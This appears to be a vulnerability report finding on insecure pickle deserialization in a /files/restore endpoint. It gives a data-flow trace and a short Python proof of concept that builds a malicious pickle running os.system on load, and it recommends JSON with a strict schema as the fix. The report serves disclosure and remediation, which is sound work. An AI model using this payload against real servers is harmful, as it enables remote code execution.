# VULN-010 — Insecure Deserialization (pickle) RCE

- **CWE**: 502
- **Severity**: High+
- **Endpoint**: `POST /files/restore` (auth; session forgeable)
- **Sink**: `files.py:178-179`

## Static Data Flow Trace

```
1. ENTRY: Attacker POST /files/restore with data=<base64 of a malicious pickle>.
   The pickle defines __reduce__ returning (os.system, ("id > /tmp/pwned",)).
   -> files.py:173  raw = request.form.get("data", "")

2. PROPAGATION: base64-decoded to bytes.
   -> files.py:178  blob = base64.b64decode(raw)

3. SINK: pickle.loads on fully attacker-controlled bytes executes __reduce__.
   -> files.py:179  obj = pickle.loads(blob)
   At this moment os.system("id > /tmp/pwned") runs on the server.

4. IMPACT: Arbitrary OS command execution (RCE) as the app user.
```

## Payload construction (illustrative, not executed)
```python
import pickle, base64, os
class E:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))
payload = base64.b64encode(pickle.dumps(E())).decode()
# POST data=payload
```

## Attacker gains
Remote code execution on the server.

## Expected vs Actual
- Secure app: never unpickle untrusted input; use JSON with a strict schema.
- Vulnerable app: `pickle.loads` on user bytes → command executes on load.
